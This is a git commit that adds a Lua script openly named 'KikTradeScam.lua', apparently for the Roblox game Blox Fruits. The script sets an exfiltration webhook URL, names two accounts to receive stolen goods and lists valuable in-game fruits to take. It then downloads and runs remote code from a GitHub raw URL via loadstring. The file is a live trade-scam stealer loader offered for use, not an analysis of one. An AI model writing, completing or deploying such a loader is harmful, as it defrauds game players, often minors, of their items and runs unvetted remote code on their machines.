8c4f55f5c481a9b30e1874b1c64c85996acbea2a
redzhubreal <sigma123alpha123beta123@gmail.com>
2025-04-04 15:05:13 +0530

    Create KikTradeScam.lua

---
+++ KikTradeScam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=S3RWdE5ZNzl4R0g5b3N0WDFzM3QwUTo5cFNfX2xVcWxFUWhFaWdkX1ZEXzY2VlplQkZtQUhaa0NLcEpWT2taa29lRkFzWXlveTFYMGk5V2pNdC1XQTUxMG1CeVcxeEN6VGxJTVM2bTFSelVHVTJBQUliQmxVMnpObXp1LS1VbVpVUnZWblVYdGtjdDRqd1JHV0YtUHRhNWw3em1EVlpvajJXV2kyNUZoY0VMUEQwQm0yMnE3bW03ZmlreWdURnNHNzg"
+Usernames = {"kshzha", "Sourlas3103"}
+FruitsToHit = {"Buddha-Buddha", "Portal-Portal", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
